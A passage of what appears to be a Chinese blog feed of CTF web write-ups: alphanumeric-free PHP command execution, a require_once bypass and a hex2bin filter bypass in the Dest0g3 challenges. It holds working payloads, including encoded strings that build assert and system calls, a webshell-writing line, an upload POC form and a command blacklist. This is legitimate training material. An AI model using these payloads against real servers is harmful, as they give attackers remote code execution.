class="line">            <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>同样经过测试 能用的字符只有：</p><img src="/2022/11/19/%E7%AE%80%E5%8D%95%E7%9C%8B%E7%9C%8B%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE/11.png" class title="qwq"><p>只能通过一个字母p，但是没有过滤点号和反引号，所以可以使用Post传文件并且通过.执行sh命令</p><p>（文件上传后储存的位置在/tmp/php+6个随机字母）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果没有过滤[]、@、-、的话，可以通过/???/????????[@-[]匹配，因为@ 和[的ascii码范围能够包括所有的大写字母</span><br><span class="line">但是这里留下了个p，所以可以直接通过/??p/p?p??????直接匹配</span><br></pre></td></tr></table></figure><p>借助一下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://6513dc73-a852-41be-9d0e-37df3309d232.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--poc--&gt;</span></span><br></pre></td></tr></table></figure><img src="/2022/11/19/%E7%AE%80%E5%8D%95%E7%9C%8B%E7%9C%8B%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE/12.png" class title="qwq"><p>burp抓包然后修改一下就可，能够找到/flag.txt，直接cat /flag.txt</p><p>有时候也可以直接.+/???/???[@-[]执行，例如ctfshow web入门 55</p><p>(只要大小于号、反引号没被过滤基本上能用上面的payload)</p><p>而且这个好像只能适用于get传参执行的样子…</p><p>（注：使用echo+反引号能够执行命令，?&gt;&lt;?=``也相当于echo+反引号）</p><p>最后附上过滤字符的php，根据题目的不同修改preg_match就好了（</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$a</span> = <span class="number">20</span>; <span class="variable">$a</span> &lt; <span class="number">127</span>; <span class="variable">$a</span>++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-oq-z0-9$]|\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;</span>, <span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>).<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>芜湖，结束了，摆烂摆烂，反正到时候也是啥都不会~</p><h2><span id="6补充"> 6.补充</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用assert(_post)型，用于disable_functions过多，只能通过写马蚁剑链接的类型：</span></span><br><span class="line">%<span class="number">24</span>_%<span class="number">3</span>D[].%<span class="number">27</span>%<span class="number">27</span>%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">3</span>D%<span class="number">24</span>_[%<span class="number">24</span>__]%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>___%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>___%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>____%<span class="number">3</span>D%<span class="number">22</span>_%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>____.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>____.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>____.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>____.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">24</span>____%<span class="number">3</span>B%<span class="number">24</span>___(%<span class="number">24</span>_[_])%<span class="number">3</span>B</span><br><span class="line"><span class="comment">//assert($_POST[_])&amp;_=file_put_contents(&#x27;1.php&#x27;, &#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用_=system&amp;__=ls型</span></span><br><span class="line">%<span class="number">24</span>_%<span class="number">3</span>D<span class="string">&#x27;&#x27;</span>.[]%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">3</span>D(%<span class="number">24</span>_[%<span class="number">24</span>__])%<span class="number">3</span>B%<span class="number">24</span>____%<span class="number">3</span>D%<span class="number">24</span>___%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_____%<span class="number">3</span>D%<span class="number">24</span>___%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">3</span>D%<span class="number">24</span>____%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_____.%<span class="number">3</span>D%<span class="number">24</span>___%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">3</span>D%<span class="number">24</span>____%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_____.%<span class="number">3</span>D%<span class="number">24</span>___%<span class="number">3</span>B%<span class="number">24</span>______%<span class="number">3</span>D_.%<span class="number">24</span>_____%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">24</span>______[_](%<span class="number">24</span>%<span class="number">24</span>______[__])%<span class="number">3</span>B</span><br></pre></td></tr></table></figure><hr><p>参考资料：</p><ul><li><a href="http://t.csdn.cn/LO770">无字母数字webshell总结</a></li><li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)</a></li><li><a href="http://t.csdn.cn/ECkdI">无字母数字的命令执行(ctfshow web 入门 55)</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;这两天一直在看的玩意，原来我已经菜到啥也不会了，qwq。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF Web" scheme="http://example.com/categories/CTF-Web/"/>
    
    
    <category term="RCE" scheme="http://example.com/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>Dest0g3 520 迎新赛部分write up</title>
    <link href="http://example.com/2022/11/13/Dest0g3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/"/>
    <id>http://example.com/2022/11/13/Dest0g3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/</id>
    <published>2022-11-13T06:42:49.000Z</published>
    <updated>2023-03-12T09:43:56.839Z</updated>
    
    <content type="html"><![CDATA[<p>你管这叫迎新赛…</p><p>猛新啊，那没事了。</p><p>只有自己不会做的世界达成了</p><p>Misc的话… 之后再看看</p><span id="more"></span><h2><span id="phpdest"> phpdest</span></h2><p>require_once绕过</p><hr><p>require_once()：引用或者包含外部的一个php文件，但是如果已经包含过一次了，该文件不会再次被包含</p><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看见flag.php已经被包含了一次了，所以我们要进行require_once的绕过</p><p>参考这篇文章的payload：</p><p><a href="https://cn-sec.com/archives/83909.html">php源码分析 require_once 绕过不能重复包含文件的限制 | CN-SEC 中文网</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span></span><br></pre></td></tr></table></figure><p>进行base64解码后就能获得flag</p><p>成功获得flag</p><h2><span id="easyphp"> EasyPHP</span></h2><p>提示：Post something</p><p>认识set_error_handler()</p><hr><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;fl4g.php&quot;</span>;</span><br><span class="line"><span class="variable">$dest0g3</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;H&quot;</span>);</span><br><span class="line"><span class="variable">$timme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;d&quot;</span>);</span><br><span class="line"><span class="variable">$timmme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;i&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$time</span> &gt; <span class="string">&quot;24&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timme</span> &gt; <span class="string">&quot;31&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timmme</span> &gt; <span class="string">&quot;60&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$fl4g</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try harder!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">set_error_handler</span>(</span><br><span class="line">    function() <span class="keyword">use</span>(&amp;$<span class="title">fl4g</span>) &#123;</span><br><span class="line">        <span class="title">print</span> $<span class="title">fl4g</span>;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$fl4g</span> .= <span class="variable">$dest0g3</span>;</span><br><span class="line"><span class="meta">?&gt;</span> Try harder!</span><br></pre></td></tr></table></figure><p>上面那个if的条件肯定是实现不了的，哪里有大于24小时或者31天或者60秒的时候啊</p><p>所以关键就是在set_error_handler()上了</p><p>这个函数是，当报错时，就会执行</p><p>也就是我们要POST传参让其报错（</p><p>又因为$fl4g 和 $dest0g3之间有个. 代表拼接</p><p>（例如fl4g=a dest0g3=b 之后的结果就是ab）</p><p>但是php中，数组和字符串是不能拼接的，会报错</p><p>所以我们传入数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>就会报错，执行set_error_hanlder 打印fl4g</p><h2><span id="simplerce"> SimpleRCE</span></h2><p>学到了新姿势…</p><p>Try Try hex2bin</p><hr><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$aaa</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;aaa&#x27;</span>];</span><br><span class="line"><span class="variable">$black_list</span>=<span class="keyword">array</span>(<span class="string">&#x27;^&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;%0&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;char&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;ascii&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;replace&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;var&#x27;</span>,<span class="string">&#x27;pastre&#x27;</span>,<span class="string">&#x27;print&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;sed&#x27;</span>,<span class="string">&#x27;pcre&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;scan&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;diff&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;pcntl&#x27;</span>,<span class="string">&#x27;proc_open&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;tac&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;sort&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;current&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;cut&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;nl&#x27;</span>,<span class="string">&#x27;wget&#x27;</span>,<span class="string">&#x27;vi&#x27;</span>,<span class="string">&#x27;grep&#x27;</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$black_list</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我的妈，那叫一个地狱绘图</p><p>ban掉了:  ^ 、.、`、大于号、小于号、等于号、双引号、正则preg、&amp;、|、%0、{}、$、+、\</p><p>然后ban掉了常用的eval执行的命令</p><p>但是，唯独少了个单引号</p><p>参考了dalao的wp，发现一个神奇的函数：hex2bin()</p><hr><p>hex2bin()：转换十六进制字符为二进制ASCII字符串</p><p>用法：hex2bin(‘hexcode’)</p><p>例：<code>echo hex2bin('68656c6c6f20776f726c64');</code>  //输出Hello World</p><p>所以没有过滤单引号给我们使用了hex2bin的机会</p><p>只需要构造出system(‘cat /flag’)就结束了</p><p><font size="5" color="violet">system --&gt; 73797374656d</font></p><p><font size="5" color="violet">cat /flag --&gt; 636174202f666c6167</font></p><p>也就是构造</p><p><code>aaa=hex2bin('73797374656d')(hex2bin('636174202f666c6167'));</code></p><p>成功获取flag</p><hr><h2><span id="funny_upload"> 